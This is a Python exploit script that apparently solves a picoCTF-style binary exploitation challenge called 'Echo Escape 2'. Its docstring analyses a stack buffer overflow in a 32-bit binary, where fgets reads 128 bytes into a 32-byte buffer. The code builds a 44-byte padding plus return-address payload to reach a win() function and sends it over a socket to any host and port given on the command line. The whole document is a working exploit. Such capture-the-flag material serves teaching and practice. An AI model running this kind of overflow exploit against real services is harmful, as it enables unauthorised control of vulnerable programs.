#!/usr/bin/env python3
"""
Solves CyLab Security Academy / picoCTF 2026 Challenge 736: Echo Escape 2
Category: Binary Exploitation
Difficulty: Medium (2)

Vulnerability Analysis:
- Architecture: 32-bit x86 ELF non-PIE executable (vuln).
- Flaw: Insecure input bounding in fgets(buf, 128, stdin). The programmer allocated
  char buf[32] but instructed fgets to read up to 128 bytes, allowing classic stack smash.
- Disassembly Analysis:
    Inside vuln():
    sub esp, 0x38
    lea eax, [ebp - 0x28]   ; buf starts at ebp - 40 (0x28)
    push eax
    push 0x80               ; 128 bytes
    call fgets
- Stack Layout:
    buf is at [ebp - 0x28] (40 bytes to saved EBP).
    Saved EBP is 4 bytes.
    Return address is at offset 40 + 4 = 44 bytes.
- Target: Function win() located at 0x080491d6.
"""

import socket
import struct
import sys
import time

WIN_ADDR = 0x080491d6
PAYLOAD_OFFSET = 44  # 40 bytes to ebp + 4 bytes saved ebp

def build_payload() -> bytes:
    payload = b"A" * PAYLOAD_OFFSET
    payload += struct.pack("<I", WIN_ADDR)
    payload += b"\n"
    return payload

def exploit_remote(host: str, port: int) -> str:
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10.0)
    s.connect((host, port))
    
    banner = s.recv(1024)
    print(f"[*] Banner received: {banner.decode('latin-1', 'replace').strip()}")
    
    payload = build_payload()
    print(f"[*] Sending {len(payload)} bytes payload...")
    s.sendall(payload)
    
    time.sleep(1)
    response = b""
    while True:
        try:
            s.settimeout(3.0)
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
        except Exception:
            break
    s.close()
    
    text = response.decode("latin-1", "replace")
    print(f"[*] Response:\n{text}")
    return text

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print("Defaulting to sample verification...")
        p = build_payload()
        print(f"Generated payload: {p.hex()}")
        sys.exit(0)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    exploit_remote(host, port)
